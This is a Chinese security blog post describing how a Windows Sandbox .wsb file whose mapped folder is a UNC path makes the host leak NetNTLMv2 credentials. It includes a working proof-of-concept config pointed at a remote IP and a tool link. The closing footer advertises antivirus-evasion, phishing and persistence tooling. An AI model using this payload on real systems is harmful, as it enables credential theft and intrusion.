#  内网漏洞--NetNTLMv2泄露  
原创 Hello888
                    Hello888  安全天书   2026-06-29 06:08  
  
本文所涉及的技术、思路和工具仅用于安全测试和防御研究，切勿将其用于非法入侵或  
攻击他人系统等目  
的，一切后果由使用者自行承担！！！  
  
漏洞介绍  
  
在我对UNCanny项目的后续时，我注意到人们对那个基于UNC的强制原语很感兴趣，尽管那个项目有一些明显的局限性。所以我一直在探索同一个想法，想出版一些更体面、更实用、更实用、更适合初次接触的作品。  
  
Windows 沙箱通常被视为打开不受信任文件的安全场所，这使得 .wsb 配置文件本身成为一个有趣的搜索对象。在沙箱访客运行之前，主机还需要解析配置文件并准备沙箱会话，在查看那个设置流程时，我专注于 MappedFolders。通常文档化的用例很简单，我们会把本地主机文件夹映射到沙箱里。所以剩下显而易见的问题是，如果HostFolder不是本地路径，而是UNC路径，会发生什么？  
  
结果发现主机会尝试验证它。  
```
<Configuration>
  <Networking>Disable</Networking>
  <MappedFolders>
    <MappedFolder>
      <HostFolder>\\192.168.139.132\wsbtest</HostFolder>
      <SandboxFolder>C:\Users\WDAGUtilityAccount\Desktop\share</SandboxFolder>
      <ReadOnly>true</ReadOnly>
    </MappedFolder>
  </MappedFolders>
</Configuration>
```  
  
打开后，Windows主机对我的IP进行了SMB NTLM认证。沙盒可能之后无法初始化，因为目标不是真正的可访问共享，但认证已经完成。.wsb  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EYGYnyEdzQWm2p4uybibEa4MXZGl2ZGRHw6IRfT6KdWicfHnAgwSyia7EQpq8vy52FQRdhJDQb5KyDdoErj1kwxOaw8OTIdkRMqHdEUzyiaVRbE/640?wx_fmt=png&from=appmsg "")  
  
GitHub地址：  
  
```
https://github.com/0xHossam/UNCagedSandbox
```  
  
  
注意：  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，  
安全性自测。  
  
**红蓝偶像练习生小圈子更多工具思路文章请加入纷传，圈子主要研究方向渗透测试、红蓝对抗、钓鱼手法思路、武器化，红队工具二开与免杀。圈内不定期分享红队技术文章，攻防经验总结以及自研工具与插件，目前圈子已满400人，欢迎各位进圈子交流学习！圈子目前更新相关技术文章：HeavenlyBypassAV内部版工具-轻松免杀各大杀软HeBypassAV内部版Patch免杀工具-轻松绕过杀软EDRHeavenly自动化红队后渗透工具免杀生成器Heavenly白加黑自动化生成免杀工具HeavenlyProtectionCS内部CS插件冰蝎webshell免杀工具哥斯拉webshell免杀工具红队场景下lnk钓鱼Bypass免杀AVFrp免杀隧道工具1day和0dayPOClnk钓鱼思路视频讲解lnk钓鱼Bypass天擎msi钓鱼chm钓鱼Kill360核晶AV对抗-致盲AV（核晶）捆绑免杀360Kill火绒火绒6.0内存免杀kill-windows DefenderDefender分离免杀Defender知识点EDR对抗思路进程注入知识点自启动思路多种维权手法Fscan免杀核晶QVM解决思路红队思路-钓鱼环境下小窗口截屏窃取免杀Todesk/向日葵读取工具渗透测试文章思路内网对抗文章思路还有更多红队工具文章！期待您的加入！！！往期推荐安全天书免杀课来袭｜助力实战免杀钓鱼(文末送福利)Patch免杀0检测！！！绕过卡巴斯基、360、Defender、火绒等【红队工具】红队内网后渗透CobaltStrike插件更新绕过360安全卫士实现维权免杀更新--Heavenly自动化生成白加黑3.0**  
  
